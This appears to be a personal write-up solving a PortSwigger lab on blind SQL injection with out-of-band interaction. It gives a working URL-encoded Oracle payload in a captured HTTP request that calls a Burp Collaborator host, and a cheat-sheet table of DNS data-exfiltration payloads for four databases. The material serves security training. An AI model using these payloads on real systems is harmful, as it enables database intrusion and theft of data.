
#portswigger #solution #sqli 

- **Category:** [[SQL injection]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
- **Date Solved:** 2026-08-11



Final payload:

```http
GET / HTTP/2
Host: 0aa900a004783691807512f300fc0082.web-security-academy.net
Cookie: TrackingId=bpbWxmtEpMjaMmDq' %20UNION%20SELECT%20EXTRACTVALUE%28xmltype%28%27%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%20%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2F8enrc8im9fewd5lmpre8ktfgn7tyhy5n%2Eoastify%2Ecom%2F%22%3E%20%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29%20FROM%20dual%20%2D%2D; session=DvrgD80zbHiho0MpjHqXEyc3GsgKVtV6
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Pay attention to encode with URL encoding first, I forgot it first time and it just didn't work lmao

I used instruction in Burp's Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

![[Pasted image 20260811172611.png]]

Here's another variation of this kind of vulnerability: 
![[Pasted image 20260811173449.png]]

We can perform DNS lookup with data exfiltration using this cheatsheet by Burp

|   |   |
|---|---|
|Oracle|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`|
|Microsoft|`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`|
|PostgreSQL|`create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`|
|MySQL|The following technique works on Windows only:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|
